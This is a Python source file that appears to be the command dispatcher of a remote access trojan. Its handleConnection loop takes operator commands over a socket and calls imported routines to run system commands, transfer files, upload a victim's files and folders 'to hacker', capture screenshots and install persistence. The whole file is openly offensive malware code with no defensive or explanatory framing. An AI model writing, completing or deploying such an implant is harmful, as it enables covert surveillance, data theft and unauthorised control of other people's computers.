from core.command import execute_command
from core.download import download_file
from core.send2hacker import upload_file_folders
from core.screenshot import capture_screenshot
from core.persistant import become_persistant
import time




def handleConnection(my_socket):
    print("[+] Handling connection")

    while True:
        user_input = my_socket.receive_data()


        print("[+] USer input: ", user_input)

        if user_input == "1":
            print("[+] Running system commands")
            # develop function that will run commands
            execute_command(my_socket)

        elif user_input == "2":
            print("[+] Donwnloading file")
            download_file(my_socket)

        elif user_input == "3":
            print("[+] Uploading to hacker")
            upload_file_folders(my_socket)
        elif user_input == "4":

            my_socket.change_dir()

        elif user_input == "5":
            capture_screenshot(my_socket)

        elif user_input == "6":
            become_persistant(my_socket)

        elif user_input == "99":
            break
        else :
            time.sleep(30)
            print("[+] Invalid user input ")